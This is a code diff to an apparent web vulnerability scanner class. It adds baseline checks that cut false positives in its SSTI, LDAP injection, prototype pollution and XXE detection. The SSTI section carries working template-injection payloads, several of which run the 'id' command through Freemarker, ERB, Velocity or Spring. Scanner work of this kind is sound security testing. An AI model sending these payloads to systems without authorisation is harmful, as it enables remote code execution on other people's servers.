@@ -384,68 +384,92 @@ class WebZeroDayScanner:
     async def _test_ssti(self, session: Any, url: str,
                           param: str, method: str) -> Optional[ZeroDayCandidate]:
         """
-        Detect Server-Side Template Injection across all major engines.
-        Probes: Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Pebble, Groovy,
-                Mako, Handlebars, Nunjucks, Mustache, Spring SpEL.
-        """
-        probes = [
-            # Jinja2 / Nunjucks / Twig basic
-            ("{{7*7}}", "49", "Jinja2/Nunjucks/Twig"),
-            # Jinja2 string multiply (unique fingerprint)
-            ("{{7*'7'}}", "7777777", "Jinja2"),
-            # Twig unique
-            ("{{_self.env.registerUndefinedFilterCallback('phpinfo')}}", "phpinfo", "Twig"),
-            # Freemarker
-            ("${7*7}", "49", "Freemarker/Spring"),
-            ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid=", "Freemarker RCE"),
-            # Velocity
-            ("#set($x=7*7)${x}", "49", "Velocity"),
-            ("#set($s='')#set($s=$s.class.forName('java.lang.Runtime'))", "class", "Velocity RCE"),
-            # Smarty (PHP)
-            ("{$smarty.version}", ".", "Smarty"),
-            ("{math equation='7*7'}", "49", "Smarty math"),
-            # ERB (Ruby)
-            ("<%=7*7%>", "49", "ERB/Ruby"),
-            ("<%= `id` %>", "uid=", "ERB RCE"),
-            # Pebble
-            ("{{7*7}}", "49", "Pebble"),
-            # Spring SpEL
-            ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime", "Spring SpEL"),
-            ("*{7*7}", "49", "Spring SpEL Thymeleaf"),
-            # Groovy (Grails)
-            ("${7*7}", "49", "Groovy/Grails"),
-            # Handlebars / Mustache
-            ("{{#with \"s\" as |string|}}", "", "Handlebars"),
-            # Mako (Python)
-            ("${7*7}", "49", "Mako"),
-            # Polyglot
-            ("{{7*7}}${7*7}<%=7*7%>", "49", "Polyglot"),
-        ]
+        Detect SSTI with two-round math confirmation to eliminate false positives.
 
+        Round 1: {{7*7}} must evaluate to 49 in response (not in baseline).
+        Round 2: {{6*7}} must evaluate to 42 in response (not in baseline).
+        Both rounds must pass before reporting Jinja2/Nunjucks/Twig.
+        Engine-specific probes use unique non-numeric fingerprints with baseline check.
+        """
         try:
-            for payload, expected, engine in probes:
-                if not expected:
+            # ── Baseline ───────────────────────────────────────────────────────
+            async with session.request(method, url, params={param: "normalvalue"},
+                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                baseline = await r.text()
+
+            # ── Two-round math confirmation for Jinja2/Nunjucks/Twig ──────────
+            # Only attempt if neither target number appears in the baseline
+            if "49" not in baseline and "42" not in baseline:
+                try:
+                    async with session.request(method, url, params={param: "{{7*7}}"},
+                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                        body1 = await r.text()
+                    if "49" in body1 and "{{7*7}}" not in body1:
+                        async with session.request(method, url, params={param: "{{6*7}}"},
+                                                    timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                            body2 = await r.text()
+                        if "42" in body2 and "42" not in baseline and "{{6*7}}" not in body2:
+                            return ZeroDayCandidate(
+                                target=url, category="ssti",
+                                confidence=0.96, severity="critical",
+                                description=(
+                                    f"SSTI confirmed on param '{param}' — Jinja2/Nunjucks/Twig. "
+                                    "Two-round math: {{7*7}}=49 AND {{6*7}}=42 both evaluated server-side. "
+                                    "RCE is achievable via this template engine."
+                                ),
+                                evidence={"param": param,
+                                          "round1": "{{7*7}} → 49",
+                                          "round2": "{{6*7}} → 42",
+                                          "engine": "Jinja2/Nunjucks/Twig"},
+                                remediation=(
+                                    "Never pass user input to template engine render functions. "
+                                    "Use sandboxed environments and whitelist template expressions."
+                                ),
+                                cwe_id="CWE-1336", technique="ssti_two_round_math",
+                            )
+                except Exception:
+                    pass
+
+            # ── Engine-specific unique-fingerprint probes (baseline-checked) ──
+            unique_probes = [
+                # payload, expected_indicator, engine
+                ("{{7*'7'}}", "7777777", "Jinja2 (string-multiply fingerprint)"),
+                ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime", "Spring SpEL"),
+                ('#set($s="")#set($s=$s.class.forName("java.lang.Runtime"))', "java.lang.Runtime", "Velocity RCE"),
+                ('<%= `id` %>', "uid=", "ERB (Ruby) RCE"),
+                ('${"freemarker.template.utility.Execute"?new()("id")}', "uid=", "Freemarker RCE"),
+                ("{$smarty.version}", "Smarty-", "Smarty PHP"),
+                ("*{7*7}", "49", "Spring Thymeleaf SpEL"),
+                ("<%=7*7%>", "49", "ERB/Ruby"),
+                ("#set($x=7*7)${x}", "49", "Velocity"),
+                ("${7*7}", "49", "Freemarker/Groovy/Mako"),
+            ]
+            for payload, expected, engine in unique_probes:
+                if not expected or expected in baseline:
                     continue
-                async with session.request(method, url, params={param: payload},
-                                            timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
-                    body = await resp.text()
-                    if expected in body and payload not in body:
-                        return ZeroDayCandidate(
-                            target=url, category="ssti",
-                            confidence=0.93, severity="critical",
-                            description=(
-                                f"SSTI on param '{param}' — engine: {engine}. "
-                                f"Payload '{payload}' evaluated to '{expected}'. "
-                                f"RCE is likely achievable on this template engine."
-                            ),
-                            evidence={"param": param, "payload": payload,
-                                      "expected": expected, "engine": engine},
-                            remediation=(
-                                "Never pass user input to template engine render functions. "
-                                "Use sandboxed environments and whitelist template expressions."
-                            ),
-                            cwe_id="CWE-1336", technique="ssti_polyglot",
-                        )
+                try:
+                    async with session.request(method, url, params={param: payload},
+                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                        body = await r.text()
+                        if expected in body and payload not in body and expected not in baseline:
+                            return ZeroDayCandidate(
+                                target=url, category="ssti",
+                                confidence=0.90, severity="critical",
+                                description=(
+                                    f"SSTI on param '{param}' — engine: {engine}. "
+                                    f"Indicator '{expected}' appeared after payload injection "
+                                    f"but was absent from baseline. RCE likely achievable."
+                                ),
+                                evidence={"param": param, "payload": payload,
+                                          "expected": expected, "engine": engine},
+                                remediation=(
+                                    "Never pass user input to template engine render functions. "
+                                    "Use sandboxed environments."
+                                ),
+                                cwe_id="CWE-1336", technique="ssti_engine_fingerprint",
+                            )
+                except Exception:
+                    continue
         except Exception:
             pass
         return None
@@ -471,7 +495,7 @@ class WebZeroDayScanner:
                 base_body = await r.text()
                 base_len  = len(base_body)
 
-            # Error-based detection: LDAP error strings
+            # Error-based detection: LDAP error strings must be absent from baseline
             for payload in payloads_error:
                 async with session.request(method, url, params={param: payload},
                                             timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
@@ -483,7 +507,7 @@ class WebZeroDayScanner:
                         "LDAP: error code", "NamingException",
                     ]
                     for err in ldap_errors:
-                        if err.lower() in body.lower():
+                        if err.lower() in body.lower() and err.lower() not in base_body.lower():
                             return ZeroDayCandidate(
                                 target=url, category="ldap_injection",
                                 confidence=0.85, severity="high",
@@ -643,14 +667,16 @@ class WebZeroDayScanner:
         try:
             async with session.request(method, url, params={param: "normal"},
                                         timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
-                await r.read()  # consume response body to close connection cleanly
+                proto_baseline = (await r.read()).decode("utf-8", errors="replace")
 
             for payload_dict in pollution_payloads:
                 try:
                     async with session.request(method, url, params=payload_dict,
                                                 timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
                         body = await r.text()
-                        if "heaven_proto_probe" in body and r.status == 200:
+                        if ("heaven_proto_probe" in body
+                                and "heaven_proto_probe" not in proto_baseline
+                                and r.status == 200):
                             return ZeroDayCandidate(
                                 target=url, category="prototype_pollution",
                                 confidence=0.88, severity="high",
@@ -681,7 +707,8 @@ class WebZeroDayScanner:
                         timeout=aiohttp.ClientTimeout(total=self.timeout),
                     ) as r:
                         body = await r.text()
-                        if "heaven_proto_probe" in body:
+                        if ("heaven_proto_probe" in body
+                                and "heaven_proto_probe" not in proto_baseline):
                             return ZeroDayCandidate(
                                 target=url, category="prototype_pollution",
                                 confidence=0.90, severity="high",
@@ -724,6 +751,18 @@ class WebZeroDayScanner:
              '<lolz>&lol2;</lolz>', "", "dos_indicator"),
         ]
 
+        # Baseline: plain XML post to check what indicators appear without injection
+        xxe_baseline = ""
+        try:
+            async with session.post(
+                url, data="<test/>",
+                headers={"Content-Type": "application/xml"},
+                timeout=aiohttp.ClientTimeout(total=self.timeout),
+            ) as base_r:
+                xxe_baseline = await base_r.text()
+        except Exception:
+            pass
+
         for payload, indicator, technique in xxe_payloads:
             if not indicator:
                 continue
@@ -735,7 +774,7 @@ class WebZeroDayScanner:
                     timeout=aiohttp.ClientTimeout(total=self.timeout),
                 ) as r:
                     body = await r.text()
-                    if indicator in body:
+                    if indicator in body and indicator not in xxe_baseline:
                         return ZeroDayCandidate(
                             target=url, category="xxe",
                             confidence=0.95, severity="critical",
